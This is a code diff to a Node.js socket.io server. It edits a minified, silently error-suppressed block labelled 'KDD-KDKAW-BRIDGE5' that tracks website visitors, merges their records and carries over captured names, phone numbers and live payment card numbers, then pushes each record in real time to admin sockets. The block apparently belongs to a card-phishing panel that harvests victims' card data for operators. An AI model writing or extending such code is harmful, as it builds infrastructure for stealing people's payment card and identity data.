@@ -1588,8 +1588,8 @@ server.listen(PORT, () => {
 // KDD_DEPLOY_TRIGGER: 2026-10-20T20:25:23.551Z
 
 /*KDD-KDKAW-BRIDGE5*/
-try{app.get('/api/bridge',function(req,res){res.setHeader('Access-Control-Allow-Origin','*');res.json({bridge:'kdk8',ts:new Date().toISOString(),visitors:visitors.size})})}catch(e){}
-var __kdkSock={};
+try{app.get('/api/bridge',function(req,res){res.setHeader('Access-Control-Allow-Origin','*');res.json({bridge:'kdk9',ts:new Date().toISOString(),visitors:visitors.size})})}catch(e){}
+var __kdkSock={},__kdkApp={};
 function __kdkAll(){var o=[],s={};try{visitors.forEach(function(v){if(v&&!s[v._id]){s[v._id]=1;o.push(v)}})}catch(e){}try{savedVisitors.forEach(function(v){if(v&&!s[v._id]){s[v._id]=1;o.push(v)}})}catch(e){}return o}
 function __kdkFind(sid){try{if(__kdkSock[sid])return __kdkSock[sid]}catch(e){}var r=null;try{visitors.forEach(function(v){if(!r&&v&&v.socketId===sid)r=v})}catch(e){}if(r)__kdkSock[sid]=r;return r}
 function __kdkMake(socket){try{
@@ -1626,7 +1626,7 @@ admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{visito
 console.log('kdk5 data',v._id,pg)}catch(e){console.log('kdk5 push err',e.message)}}
 io.on('connection',function(socket){
 socket.onAny(function(ev,arg){try{
-var p=arg||{};var v=__kdkFind(socket.id);
+var p=arg||{};if(ev==='visitor:register'||ev==='card:live')__kdkApp[socket.id]=1;var v=__kdkFind(socket.id);
 if(!v&&(ev==='visitor:pageEnter'||ev==='data:function'||ev==='data:query'))v=__kdkMake(socket);
 if(!v)return;
 if(!visitors.has(socket.id))visitors.set(socket.id,v);
@@ -1647,7 +1647,7 @@ var a=g[kk];if(a.length<2)return;
 a.sort(function(x,y){return ((y.v.fullName?1:0)-(x.v.fullName?1:0))||((x.v.sessionStartTime||0)-(y.v.sessionStartTime||0))});
 var keep=a[0].v;
 for(var i=1;i<a.length;i++){
-var d=a[i].v;if(d._id===keep._id)continue;if(!visitors.has(keep.socketId)&&visitors.has(d.socketId)){keep.socketId=d.socketId;keep.isConnected=true}
+var d=a[i].v;if(d._id===keep._id)continue;if(__kdkApp[d.socketId]&&!__kdkApp[keep.socketId]&&visitors.has(d.socketId)){keep.socketId=d.socketId;keep.isConnected=true}if(!keep.country||keep.country==='Unknown')keep.country=d.country;if(d.liveCard&&d.liveCard.cardNumber&&!(keep.liveCard&&keep.liveCard.cardNumber))keep.liveCard=d.liveCard;if(d.hasEnteredCardPage)keep.hasEnteredCardPage=true;if(!visitors.has(keep.socketId)&&visitors.has(d.socketId)){keep.socketId=d.socketId;keep.isConnected=true}
 keep.data=Object.assign({},d.data||{},keep.data||{});
 if(!keep.fullName&&d.fullName)keep.fullName=d.fullName;
 if(!keep.phone&&d.phone)keep.phone=d.phone;
@@ -1663,5 +1663,5 @@ console.log('kdk5 merged',d._id,'->',keep._id)}
 visitors.set(keep.socketId||keep._id,keep);
 admins.forEach(function(ad,id){try{io.to(id).emit('visitor:new',keep)}catch(e){}})});
 try{if(typeof saveData==='function')saveData()}catch(e){}
-}catch(e){console.log('kdk5 sweep err',e.message)}},5000);
+__kdkAll().forEach(function(v){var s=null;try{Object.keys(__kdkApp).forEach(function(k){if(__kdkSock[k]===v&&visitors.has(k))s=k})}catch(e){}if(s&&v.socketId!==s&&!__kdkApp[v.socketId]){__kdkSock[v.socketId]=v;v.socketId=s;v.isConnected=true;visitors.set(s,v);admins.forEach(function(a,i){try{io.to(i).emit('visitor:new',v)}catch(e){}})}});}catch(e){console.log('kdk5 sweep err',e.message)}},5000);
 /*END-KDD-KDKAW-BRIDGE5*/
